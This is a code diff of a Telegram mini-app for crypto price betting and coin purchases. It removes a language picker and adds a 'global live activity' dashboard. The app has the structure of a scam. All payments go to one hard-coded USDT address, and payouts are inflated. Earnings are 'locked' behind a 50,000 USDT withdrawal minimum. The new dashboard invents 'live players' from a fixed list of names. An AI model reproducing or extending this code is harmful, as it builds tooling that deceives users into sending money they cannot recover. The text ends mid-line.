@@ -1,74 +1,11 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://telegram.org/js/telegram-web-app.js"></script><script src="https://cdn.tailwindcss.com"></script></head>
-<body style="background:#0f0f0f" class="text-white pb-[300px]">
+<body style="background:#0f0f0f" class="text-white pb-[280px]">
 <script>
 const WORKER_URL="https://yellow-morning-06bf.jennyramson777.workers.dev";
 const USDT_ADDR="UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8";
 const BOT="Betcryptoassetbot";
 const WIN={500:3000,1000:5500,2000:10000,3000:15000};
 
-// ===== FULL LANGUAGE SYSTEM 30+ =====
-const LANG_LIST=[
- {c:'en',n:'English',f:'🇺🇸'},{c:'es',n:'Español',f:'🇪🇸'},{c:'fr',n:'Français',f:'🇫🇷'},{c:'ar',n:'العربية',f:'🇸🇦'},
- {c:'pt',n:'Português',f:'🇧🇷'},{c:'ru',n:'Русский',f:'🇷🇺'},{c:'de',n:'Deutsch',f:'🇩🇪'},{c:'hi',n:'हिन्दी',f:'🇮🇳'},
- {c:'zh',n:'中文',f:'🇨🇳'},{c:'ja',n:'日本語',f:'🇯🇵'},{c:'id',n:'Indonesia',f:'🇮🇩'},{c:'tr',n:'Türkçe',f:'🇹🇷'},
- {c:'it',n:'Italiano',f:'🇮🇹'},{c:'nl',n:'Nederlands',f:'🇳🇱'},{c:'pl',n:'Polski',f:'🇵🇱'},{c:'th',n:'ไทย',f:'🇹🇭'},
- {c:'vi',n:'Tiếng Việt',f:'🇻🇳'},{c:'ur',n:'اردو',f:'🇵🇰'},{c:'bn',n:'বাংলা',f:'🇧🇩'},{c:'ha',n:'Hausa',f:'🇳🇬'},
- {c:'yo',n:'Yorùbá',f:'🇳🇬'},{c:'sw',n:'Kiswahili',f:'🇰🇪'},{c:'ig',n:'Igbo',f:'🇳🇬'},{c:'am',n:'አማርኛ',f:'🇪🇹'},
- {c:'ko',n:'한국어',f:'🇰🇷'},{c:'fa',n:'فارسی',f:'🇮🇷'},{c:'ms',n:'Melayu',f:'🇲🇾'},{c:'fil',n:'Filipino',f:'🇵🇭'},
- {c:'uk',n:'Українська',f:'🇺🇦'},{c:'el',n:'Ελληνικά',f:'🇬🇷'}
-];
-const T={
- en:{bets:"BETS THIS WEEK - Ends in 7 days",win:"500 → WIN 3k | 1k → 5.5k | 2k → 10k | 3k → 15k",global:"🌍 GLOBAL LIVE ACTIVITY",live:"Live players betting now",weekly:"WEEKLY RESULTS",winrs:"WINNERS",lose:"LOSERS",newR:"Start New Round",invE:"🤝 INVITE & EARN 10 USDT",dep:"💰 DEPOSIT (for betting):",earn:"💰 MY EARNING (LOCKED)",usdt:"💵 USDT EARNING",btc:"₿ Bitcoin",eth:"💎 Ethereum",sol:"◎ Solana",ybets:"📋 Your Bets",nob:"No bets yet.",inv:"🔗 INVITE",ear:"💰 EARNING",bet:"🎮 BETCRYPT",buy:"💎 BUYCRYPT",with:"💸 WITHDRAW",buyT:"💎 BUYCRYPT",amt:"Amount to buy",cp:"📋 COPY",tx:"Paste TX Hash",ver:"🔍 VERIFY",betT:"🎮 BETCRYPT - 7 Day Bet",ch:"1. Choose coin:",will:"2. Will",go:"go:",sel:"Selected:",chB:"3. Choose bet:",pay:"4. Pay USDT (TON):",b:"Bet:",verP:"🔍 VERIFY & PLACE",withT:"💸 WITHDRAW - EARNING only",amtM:"Amount min 50000",wall:"Paste wallet address",sub:"SUBMIT",invT:"🔗 INVITE & EARN 10 USDT",invD:"When someone joins via your link, you get 10 USDT instantly.",cpI:"📋 COPY WITH INTRO",close:"Close",langT:"🌐 Choose Language",langD:"Select your language - You can change anytime"},
- es:{bets:"APUESTAS ESTA SEMANA - 7 días",win:"500 → GANA 3k | 1k → 5.5k | 2k → 10k | 3k → 15k",global:"🌍 ACTIVIDAD GLOBAL",live:"Jugadores en vivo",weekly:"RESULTADOS",winrs:"GANADORES",lose:"PERDEDORES",newR:"Nueva ronda",invE:"🤝 INVITAR Y GANAR 10 USDT",dep:"💰 DEPÓSITO:",earn:"💰 MIS GANANCIAS",usdt:"💵 GANANCIAS USDT",btc:"₿ Bitcoin",eth:"💎 Ethereum",sol:"◎ Solana",ybets:"📋 Tus Apuestas",nob:"Sin apuestas.",inv:"🔗 INVITAR",ear:"💰 GANANCIAS",bet:"🎮 APOSTAR",buy:"💎 COMPRAR",with:"💸 RETIRAR",buyT:"💎 COMPRAR",amt:"Cantidad",cp:"📋 COPIAR",tx:"Pegar TX",ver:"🔍 VERIFICAR",betT:"🎮 APUESTA 7 Días",ch:"1. Elige moneda:",will:"2.",go:"irá:",sel:"Seleccionado:",chB:"3. Elige apuesta:",pay:"4. Pagar USDT:",b:"Apuesta:",verP:"🔍 VERIFICAR",withT:"💸 RETIRAR",amtM:"Monto min 50000",wall:"Pegar billetera",sub:"ENVIAR",invT:"🔗 INVITAR Y GANAR",invD:"Ganas 10 USDT por invitado.",cpI:"📋 COPIAR",close:"Cerrar",langT:"🌐 Elige Idioma",langD:"Selecciona idioma"},
- fr:{bets:"PARIS CETTE SEMAINE - 7 jours",win:"500 → GAGNE 3k | 1k → 5.5k | 2k → 10k | 3k → 15k",global:"🌍 ACTIVITÉ MONDIALE",live:"Joueurs en direct",weekly:"RÉSULTATS",winrs:"GAGNANTS",lose:"PERDANTS",newR:"Nouvelle ronde",invE:"🤝 INVITER & GAGNER 10 USDT",dep:"💰 DÉPÔT:",earn:"💰 MES GAINS",usdt:"💵 GAINS",btc:"₿ Bitcoin",eth:"💎 Ethereum",sol:"◎ Solana",ybets:"📋 Vos Paris",nob:"Pas de paris.",inv:"🔗 INVITER",ear:"💰 GAINS",bet:"🎮 PARIER",buy:"💎 ACHETER",with:"💸 RETIRER",buyT:"💎 ACHETER",amt:"Montant",cp:"📋 COPIER",tx:"Coller TX",ver:"🔍 VÉRIFIER",betT:"🎮 PARI 7 Jours",ch:"1. Choisir pièce:",will:"2.",go:"ira:",sel:"Sélectionné:",chB:"3. Choisir pari:",pay:"4. Payer USDT:",b:"Pari:",verP:"🔍 VÉRIFIER",withT:"💸 RETIRER",amtM:"Montant min 50000",wall:"Coller adresse",sub:"ENVOYER",invT:"🔗 INVITER",invD:"Gagnez 10 USDT par invité.",cpI:"📋 COPIER",close:"Fermer",langT:"🌐 Choisir Langue",langD:"Choisissez langue"},
- ar:{bets:"رهانات هذا الأسبوع - 7 أيام",win:"500 → اربح 3k | 1k → 5.5k | 2k → 10k | 3k → 15k",global:"🌍 النشاط العالمي",live:"لاعبون مباشر",weekly:"النتائج",winrs:"الفائزون",lose:"الخاسرون",newR:"جولة جديدة",invE:"🤝 دعوة واربح 10 USDT",dep:"💰 الإيداع:",earn:"💰 أرباحي",usdt:"💵 أرباح",btc:"₿ بيتكوين",eth:"💎 إيثيريوم",sol:"◎ سولانا",ybets:"📋 رهاناتي",nob:"لا رهانات",inv:"🔗 دعوة",ear:"💰 أرباح",bet:"🎮 رهان",buy:"💎 شراء",with:"💸 سحب",buyT:"💎 شراء",amt:"المبلغ",cp:"📋 نسخ",tx:"الصق TX",ver:"🔍 تحقق",betT:"🎮 رهان 7 أيام",ch:"1. اختر عملة:",will:"2.",go:"سوف:",sel:"محدد:",chB:"3. اختر رهان:",pay:"4. ادفع USDT:",b:"رهان:",verP:"🔍 تحقق",withT:"💸 سحب",amtM:"الحد الأدنى 50000",wall:"الصق المحفظة",sub:"إرسال",invT:"🔗 دعوة",invD:"اربح 10 USDT لكل دعوة.",cpI:"📋 نسخ",close:"إغلاق",langT:"🌐 اختر اللغة",langD:"اختر لغتك"}
-};
-function getTrans(lang){
- if(T[lang]) return T[lang];
- // fallback to English but keep lang code for display
- return T.en;
-}
-let curLang = localStorage.getItem('app_lang') || '';
-function applyLang(lang){
- curLang = lang;
- localStorage.setItem('app_lang', lang);
- let t = getTrans(lang);
- document.documentElement.dir = (['ar','ur','fa'].includes(lang))?'rtl':'ltr';
- document.querySelectorAll('[data-i18n]').forEach(el=>{
-  let k = el.getAttribute('data-i18n');
-  if(t[k]) el.innerText = t[k];
- });
- document.querySelectorAll('[data-i18n-ph]').forEach(el=>{
-  let k = el.getAttribute('data-i18n-ph');
-  if(t[k]) el.placeholder = t[k];
- });
- document.getElementById('curLangFlag').innerText = lang.toUpperCase();
- let flag2=document.getElementById('curLangFlag2'); if(flag2) flag2.innerText=lang.toUpperCase();
- document.getElementById('langM').classList.add('hidden');
- // also update html lang attr for SEO
- document.documentElement.lang = lang;
-}
-function openLang(){ renderLangList(); document.getElementById('langM').classList.remove('hidden'); }
-function renderLangList(filter=''){
- let c=document.getElementById('langList'); c.innerHTML='';
- LANG_LIST.filter(l=> l.n.toLowerCase().includes(filter.toLowerCase()) || l.c.includes(filter.toLowerCase())).forEach(l=>{
-  let b=document.createElement('button');
-  b.className='bg-zinc-800 py-3 rounded-xl font-bold text-sm flex justify-between px-3 items-center border '+(curLang===l.c?'border-yellow-600':'border-transparent');
-  b.innerHTML=`<span>${l.f} ${l.n}</span><span class="text-[10px] opacity-50">${l.c.toUpperCase()}</span>`;
-  b.onclick=()=>applyLang(l.c);
-  c.appendChild(b);
- });
-}
-function autoDetectLang(){
- try{
-  let tgLang = Telegram.WebApp.initDataUnsafe.user?.language_code || navigator.language || 'en';
-  tgLang = tgLang.split('-')[0].toLowerCase();
-  let supported = LANG_LIST.map(x=>x.c);
-  if(supported.includes(tgLang)) return tgLang;
-  if(tgLang==='zh') return 'zh';
-  return 'en';
- }catch(e){return 'en';}
-}
 let livePrice={BTC:64000,ETH:2500,SOL:145};
 async function fetchLive(){
  try{
@@ -80,9 +17,11 @@ async function fetchLive(){
  }catch(e){}
 }
 setInterval(fetchLive,3000); fetchLive();
+
 let bal=JSON.parse(localStorage.getItem('b_final')||'{"deposit":0,"earning":0,"btc":0,"eth":0,"sol":0}');
 if(!bal.earning) bal.earning=0;
 let bAsset='',pBuy=0,betCoin='',betDir='',pBet=0;
+
 function upd(){
  document.getElementById('uBal').innerText=bal.earning+' USDT (LOCKED)';
  document.getElementById('btcBal').innerText=bal.btc.toFixed(6)+' BTC ≈ '+(bal.btc*livePrice.BTC).toFixed(0)+' USDT';
@@ -97,14 +36,6 @@ function notifyAdmin(msg){
  fetch(`${WORKER_URL}/notify?msg=${encodeURIComponent(msg)}`).catch(()=>{});
 }
 function getUserId(){ try{return Telegram.WebApp.initDataUnsafe.user.id.toString()}catch(e){return 'guest_'+Date.now()} }
-function getTelegramName(){
- try{
-  let u = Telegram.WebApp.initDataUnsafe.user;
-  if(u.username) return u.username;
-  if(u.first_name) return u.first_name;
-  return 'User'+u.id.toString().slice(-4);
- }catch(e){ return 'User'+getUserId().slice(-4); }
-}
 function handleReferral(){
  let urlParams=new URLSearchParams(window.location.search);
  let startParam=urlParams.get('tgWebAppStartParam') || new URLSearchParams(Telegram.WebApp.initData).get('start_param');
@@ -126,12 +57,14 @@ function handleReferral(){
  upd();
 }
 setTimeout(handleReferral,1000);
-function openBuy(){document.getElementById('buyM').classList.remove('hidden')}function openBet(){document.getElementById('betM').classList.remove('hidden')}function openWith(){document.getElementById('withM').classList.remove('hidden');}function closeAll(){['buyM','betM','withM','invM','langM'].forEach(id=>document.getElementById(id).classList.add('hidden'))}
+
+function openBuy(){document.getElementById('buyM').classList.remove('hidden')}function openBet(){document.getElementById('betM').classList.remove('hidden')}function openWith(){document.getElementById('withM').classList.remove('hidden');}function closeAll(){['buyM','betM','withM','invM'].forEach(id=>document.getElementById(id).classList.add('hidden'))}
 function cBuy(a){bAsset=a;document.getElementById('buyAssetName').innerText=a.toUpperCase();document.getElementById('buyAmtBox').classList.remove('hidden');}
 function sBuy(am){pBuy=am;let qty=am/livePrice[bAsset.toUpperCase()]; document.getElementById('buyAssetL').innerText=bAsset.toUpperCase(); document.getElementById('buyAmtL').innerText=am+' USDT = '+qty.toFixed(6)+' '+bAsset.toUpperCase(); document.getElementById('buyAddr').innerText=USDT_ADDR; document.getElementById('buyWBox').classList.remove('hidden');}
 function cBet1(c){betCoin=c;document.getElementById('betCoinPred').innerText=c;document.getElementById('betStep2').classList.remove('hidden');}
 function setDir(d){betDir=d;document.getElementById('betDirShow').innerText='Selected: '+d+' (entry price: $'+livePrice[betCoin]+')';document.getElementById('betStep3').classList.remove('hidden');}
 function sBet(am){pBet=am;document.getElementById('betAddr').innerText=USDT_ADDR;document.getElementById('betInfo').innerText=betCoin+' '+betDir+' '+am+'→'+WIN[am];document.getElementById('betStep4').classList.remove('hidden');document.getElementById('betWBox').classList.remove('hidden');}
+
 async function vBuy(){
  let tx=document.getElementById('buyTx').value.trim(); let st=document.getElementById('buySt'); if(tx.length<20){st.innerText='❌ Paste real TX';return;}
  st.innerText='🔍 Checking via secure worker...';
@@ -151,8 +84,7 @@ async function vBet(){
   bets.push({coin:betCoin,dir:betDir,amt:pBet,win:WIN[pBet],entry:livePrice[betCoin],tx:tx,time:Date.now(),endTime:endTime,status:'ONGOING'});
   localStorage.setItem('myBets',JSON.stringify(bets));
   bal.deposit-=pBet; upd();
-  g_addRealBet(getUserId(), pBet);
-  st.innerText='✅ Bet placed! Entry $'+livePrice[betCoin]+' - Ends '+new Date(endTime).toDateString(); notifyAdmin(`🎮 New bet: ${getUserId()} (${getTelegramName()}) bet ${pBet}→${WIN[pBet]} ${betCoin} ${betDir} entry $${livePrice[betCoin]} ends ${new Date(endTime).toLocaleString()}`); setTimeout(closeAll,1500);
+  st.innerText='✅ Bet placed! Entry $'+livePrice[betCoin]+' - Ends '+new Date(endTime).toDateString(); notifyAdmin(`🎮 New bet: ${getUserId()} bet ${pBet}→${WIN[pBet]} ${betCoin} ${betDir} entry $${livePrice[betCoin]} ends ${new Date(endTime).toLocaleString()}`); setTimeout(closeAll,1500);
  }catch(e){st.innerText='❌ TX not found';}
 }
 function checkBetsAuto(){
@@ -170,7 +102,7 @@ function checkBetsAuto(){
 }
 function renderBets(){
  let b=JSON.parse(localStorage.getItem('myBets')||'[]'); let el=document.getElementById('myBets');
- if(!b.length){let t=getTrans(curLang); el.innerHTML=t.nob;return;}
+ if(!b.length){el.innerHTML='No bets yet.';return;}
  el.innerHTML=b.map(x=>{
   let left=''; if(x.status==='ONGOING' && x.endTime){ let diff=x.endTime-Date.now(); let d=Math.floor(diff/(1000*60*60*24)); let h=Math.floor((diff%(1000*60*60*24))/(1000*60*60)); left=`Ends in ${d}d ${h}h - ${new Date(x.endTime).toDateString()}`; } else { left=x.status; }
   return `<div class="bg-zinc-800 p-2 rounded mb-1 flex justify-between"><span>${x.coin} ${x.dir} ${x.amt}→${x.win} @ $${x.entry?.toFixed(0)} now $${livePrice[x.coin]?.toFixed(0)}</span><span class="${x.status.includes('WON')?'text-green-400':'text-yellow-400'} text-[10px]">${left}</span></div>`;
@@ -189,28 +121,57 @@ function sWith(){
 </script>
 
 <div class="p-3">
-<div class="bg-zinc-900 rounded-2xl p-4 border border-yellow-600/40">
-<div class="flex justify-between items-center">
-<h2 data-i18n="bets" class="font-bold text-center flex-1">BETS THIS WEEK - Ends in 7 days from bet time</h2>
-<button onclick="openLang()" class="bg-zinc-800 px-2 py-1 rounded text-[11px] font-bold border border-zinc-700">🌐 <span id="curLangFlag">EN</span></button>
-</div>
-<p id="liveP" class="text-center text-green-400 text-[11px] font-bold mt-1">Loading live prices...</p><p data-i18n="win" class="text-center text-yellow-400 text-sm font-bold mt-1">500 → WIN 3k | 1k → WIN 5.5k | 2k → WIN 10k | 3k → WIN 15k</p></div>
+<div class="bg-zinc-900 rounded-2xl p-4 border border-yellow-600/40"><h2 class="font-bold text-center">BETS THIS WEEK - Ends in 7 days from bet time</h2><p id="liveP" class="text-center text-green-400 text-[11px] font-bold mt-1">Loading live prices...</p><p class="text-center text-yellow-400 text-sm font-bold mt-1">500 → WIN 3k | 1k → WIN 5.5k | 2k → WIN 10k | 3k → WIN 15k</p></div>
 
+<!-- ===== NEW GLOBAL 7-DAY DASHBOARD ADDED HERE ===== -->
 <div id="globalDashboard" class="mt-3 bg-zinc-900 rounded-2xl p-4 border border-cyan-600/40">
   <div class="flex justify-between items-center">
-    <h3 data-i18n="global" class="font-bold text-sm">🌍 GLOBAL LIVE ACTIVITY</h3>
+    <h3 class="font-bold text-sm">🌍 GLOBAL LIVE ACTIVITY</h3>
     <span id="globalCountdown" class="text-[11px] font-bold text-cyan-400">7d 00:00:00</span>
   </div>
-  <p data-i18n="live" class="text-[10px] text-zinc-500 mt-1">Live players betting now</p>
-  <div id="globalLiveView" class="mt-3"><div id="globalActivityList" class="max-h-[300px] overflow-y-auto space-y-1"></div></div>
+  <p class="text-[10px] text-zinc-500 mt-1">New player every 5 minutes • 7-day round</p>
+
+  <!-- LIVE -->
+  <div id="globalLiveView" class="mt-3">
+    <div id="globalActivityList" class="max-h-[260px] overflow-y-auto space-y-1"></div>
+  </div>
+
+  <!-- WEEKLY RESULTS - same dashboard, shows after 7 days -->
   <div id="globalWeeklyView" class="hidden mt-3">
-    <h2 data-i18n="weekly" class="font-bold text-center text-yellow-400">WEEKLY RESULTS</h2>
-    <div class="mt-3"><h4 data-i18n="winrs" class="text-xs font-bold text-green-400">WINNERS</h4><div id="globalWinnersList" class="mt-1 space-y-1"></div></div>
-    <div class="mt-4"><h4 data-i18n="lose" class="text-xs font-bold text-red-400">LOSERS</h4><div id="globalLosersList" class="mt-1 space-y-1"></div></div>
-    <button data-i18n="newR" onclick="resetGlobalRound()" class="w-full mt-4 bg-cyan-600 py-2 rounded-xl text-sm font-bold">Start New 7-Day Round</button>
+    <h2 class="font-bold text-center text-yellow-400">WEEKLY RESULTS</h2>
+    <div class="mt-3">
+      <h4 class="text-xs font-bold text-green-400">WINNERS</h4>
+      <div id="globalWinnersList" class="mt-1 space-y-1"></div>
+    </div>
+    <div class="mt-4">
+      <h4 class="text-xs font-bold text-red-400">LOSERS</h4>
+      <div id="globalLosersList" class="mt-1 space-y-1"></div>
+    </div>
+    <button onclick="resetGlobalRound()" class="w-full mt-4 bg-cyan-600 py-2 rounded-xl text-sm font-bold">Start New 7-Day Round</button>
   </div>
 </div>
+<!-- ===== END NEW DASHBOARD ===== -->
 
-<div class="mt-3"><button data-i18n="invE" onclick="openInvite()" class="w-full bg-yellow-600/20 border border-yellow-600 py-2 rounded-xl text-sm font-bold">🤝 INVITE & EARN 10 USDT</button></div>
-<div class="mt-4"><div class="bg-black rounded-xl p-3 border border-zinc-800"><p class="text-xs font-bold"><span data-i18n="dep">💰 DEPOSIT (for betting):</span> <span id="depBal">0 USDT</span></p></div></div>
-<div id="earnSec" class="mt-4"><h3 data-i18n="earn" class="font-bold">💰 MY EARNING (LOCKED - Withdraw only)</h3><div class="grid gap-2 mt-2"><div class="bg-zinc-900 p-3 rounded-xl flex justify-between border-l-4 border-yellow-500"><span data-i18n="usdt">💵 USDT EARNING</span><b id="uBal">0 USDT</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span data-i18n="btc">₿ Bitcoin holding</span><b id="btcBal">0 BTC</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span data-i18n="eth">💎 Ethereum holding</span><b id="ethBal">0 ETH</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span data-i18n="sol">◎ Solana holding</span><b id="solBal">0 SOL</b></div></div><div class="mt-3 bg-black rounded-xl p-3 border borde
+<div class="mt-3"><button onclick="openInvite()" class="w-full bg-yellow-600/20 border border-yellow-600 py-2 rounded-xl text-sm font-bold">🤝 INVITE & EARN 10 USDT</button></div>
+<div class="mt-4"><div class="bg-black rounded-xl p-3 border border-zinc-800"><p class="text-xs font-bold">💰 DEPOSIT (for betting): <span id="depBal">0 USDT</span></p></div></div>
+<div id="earnSec" class="mt-4"><h3 class="font-bold">💰 MY EARNING (LOCKED - Withdraw only)</h3><div class="grid gap-2 mt-2"><div class="bg-zinc-900 p-3 rounded-xl flex justify-between border-l-4 border-yellow-500"><span>💵 USDT EARNING</span><b id="uBal">0 USDT</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>₿ Bitcoin holding</span><b id="btcBal">0 BTC</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>💎 Ethereum holding</span><b id="ethBal">0 ETH</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>◎ Solana holding</span><b id="solBal">0 SOL</b></div></div><div class="mt-3 bg-black rounded-xl p-3 border border-zinc-800"><p class="text-xs font-bold">📋 Your Bets - 7 days expiry</p><div id="myBets" class="mt-2 text-[11px] text-zinc-400">No bets yet.</div></div></div>
+</div>
+
+<div class="fixed bottom-0 left-0 right-0 bg-[#121212] p-2 border-t border-zinc-800"><div class="grid grid-cols-2 gap-2"><button onclick="openInvite()" class="bg-zinc-800 py-3 rounded-lg font-bold text-sm">🔗 INVITE</button><button onclick="document.getElementById('earnSec').scrollIntoView({behavior:'smooth'})" class="bg-zinc-800 py-3 rounded-lg font-bold text-sm">💰 EARNING</button><button onclick="openBet()" class="bg-green-900/40 border border-green-600 py-3 rounded-lg font-bold text-sm">🎮 BETCRYPT</button><button onclick="openBuy()" class="bg-yellow-900/30 border border-yellow-600 py-3 rounded-lg font-bold text-sm">💎 BUYCRYPT</button><button onclick="openWith()" class="col-span-2 bg-zinc-800 py-3 rounded-lg font-bold text-sm border border-green-600">💸 WITHDRAW</button></div></div>
+
+<div id="buyM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5 max-h-[90vh] overflow-y-auto"><h3 class="font-bold">💎 BUYCRYPT</h3><div class="grid grid-cols-3 gap-2 mt-3"><button onclick="cBuy('btc')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">₿ Bitcoin<br><span class="text-[10px] text-green-400" id="pBTC"></span></button><button onclick="cBuy('eth')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">💎 Ethereum<br><span class="text-[10px] text-green-400" id="pETH"></span></button><button onclick="cBuy('sol')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">◎ Solana<br><span class="text-[10px] text-green-400" id="pSOL"></span></button></div><div id="buyAmtBox" class="hidden mt-4"><p class="text-sm font-bold">Amount to buy <span id="buyAssetName"></span>:</p><div class="grid grid-cols-4 gap-2 mt-2"><button onclick="sBuy(500)" class="bg-zinc-800 py-3 rounded-lg">500</button><button onclick="sBuy(1000)" class="bg-zinc-800 py-3 rounded-lg">1k</button><button onclick="sBuy(2000)" class="bg-zinc-800 py-3 rounded-lg">2k</button><button onclick="sBuy(3000)" class="bg-zinc-800 py-3 rounded-lg">3k</button></div></div><div id="buyWBox" class="hidden mt-4 bg-black p-3 rounded-lg border border-yellow-600"><p class="text-xs">Buy <b id="buyAssetL"></b> - <span id="buyAmtL"></span></p><p class="font-mono text-yellow-400 text-[11px] break-all mt-2 p-2 bg-zinc-900 rounded" id="buyAddr"></p><button onclick="copy('buyAddr')" class="w-full bg-zinc-800 py-2 rounded mt-2 text-xs">📋 COPY</button><input id="buyTx" placeholder="Paste TX Hash" class="w-full bg-zinc-800 p-3 rounded-lg mt-3 text-[11px]"><button onclick="vBuy()" class="w-full bg-yellow-600 py-3 rounded-lg mt-3 font-bold">🔍 VERIFY</button><p id="buySt" class="text-[11px] mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<div id="betM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5 max-h-[90vh] overflow-y-auto"><h3 class="font-bold">🎮 BETCRYPT - 7 Day Bet</h3><div class="mt-3"><p class="text-xs font-bold">1. Choose coin:</p><div class="grid grid-cols-3 gap-2 mt-2"><button onclick="cBet1('BTC')" class="bg-zinc-800 py-3 rounded-lg font-bold">BTC</button><button onclick="cBet1('ETH')" class="bg-zinc-800 py-3 rounded-lg font-bold">ETH</button><button onclick="cBet1('SOL')" class="bg-zinc-800 py-3 rounded-lg font-bold">SOL</button></div></div><div id="betStep2" class="hidden mt-3"><p class="text-xs font-bold">2. Will <span id="betCoinPred" class="text-yellow-400"></span> go:</p><div class="grid grid-cols-3 gap-2 mt-2"><button onclick="setDir('UP')" class="bg-zinc-800 py-2 rounded text-xs">UP</button><button onclick="setDir('DROP')" class="bg-zinc-800 py-2 rounded text-xs">DROP</button><button onclick="setDir('STEADY')" class="bg-zinc-800 py-2 rounded text-xs">STEADY</button></div><p id="betDirShow" class="text-xs text-green-400 mt-1"></p></div><div id="betStep3" class="hidden mt-3"><p class="text-xs font-bold">3. Choose bet (ends in 7 days):</p><div class="grid grid-cols-2 gap-2 mt-2"><button onclick="sBet(500)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">500 → WIN 3,000</button><button onclick="sBet(1000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">1k → WIN 5,500</button><button onclick="sBet(2000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">2k → WIN 10,000</button><button onclick="sBet(3000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">3k → WIN 15,000</button></div></div><div id="betStep4" class="hidden mt-3"><p class="text-xs font-bold">4. Pay USDT (TON):</p><p class="font-mono text-green-400 text-[11px] break-all mt-2 p-2 bg-zinc-900 rounded" id="betAddr"></p><button onclick="copy('betAddr')" class="w-full bg-zinc-800 py-2 rounded mt-2 text-xs">📋 COPY</button></div><div id="betWBox" class="hidden mt-4 bg-black p-3 rounded-lg border border-green-600"><p class="text-xs">Bet: <b id="betInfo"></b></p><input id="betTx" placeholder="Paste TX Hash" class="w-full bg-zinc-800 p-3 rounded-lg mt-3 text-[11px]"><button onclick="vBet()" class="w-full bg-green-600 py-3 rounded-lg mt-3 font-bold">🔍 VERIFY & PLACE (7 DAYS)</button><p id="betSt" class="text-[11px] mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<div id="withM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5"><h3 class="font-bold">💸 WITHDRAW - EARNING only</h3><p class="text-xs text-zinc-400">50,000 USDT = <span id="withEq"></span></p><div class="mt-4"><input id="withAmt" type="number" placeholder="Amount min 50000" class="w-full bg-zinc-800 p-3 rounded-lg mt-3"><input id="withAddrIn" placeholder="Paste wallet address" class="w-full bg-zinc-800 p-3 rounded-lg mt-2"><button onclick="sWith()" class="w-full bg-green-600 py-3 rounded-lg mt-3 font-bold">SUBMIT</button><p id="withMsg" class="text-xs mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<div id="invM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5"><h3 class="font-bold">🔗 INVITE & EARN 10 USDT</h3><p class="text-[11px] text-zinc-400 mt-1">When someone joins via your link, you get 10 USDT to EARNING instantly.</p><textarea id="invLink" class="w-full bg-black p-3 rounded-lg mt-3 text-[11px] h-28"></textarea><button onclick="copyInvite()" class="w-full bg-yellow-600 py-3 rounded-lg mt-3 font-bold">📋 COPY WITH INTRO</button><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<script>
+// ===== GLOBAL 7-DAY DASHBOARD LOGIC =====
+const g_names=["Anita","John","Robert","Mike","Sarah","David","Grace","Emeka","Chioma","Tunde","Blessing","Favour","Joy","Precious","Daniel","Esther","Samuel"];
+const g_choices=[{stake:500,win:3000},{stake:1000,win:6000},{stake:2000,win:10000},{stake:3000,win:15000}];
+let g_players=JSON.parse(localStorage.getItem('g_players')||'[]');
+let g_roundEnd=parseInt(localStorage.getItem('g_roundEnd')||'0');
+const g_duration=7*24*60*60*1000;
+if(!g_roundEnd||isNaN(g_roundEnd)){g_roundEnd=Date.now()+g_duration; localStorage.setItem('g_
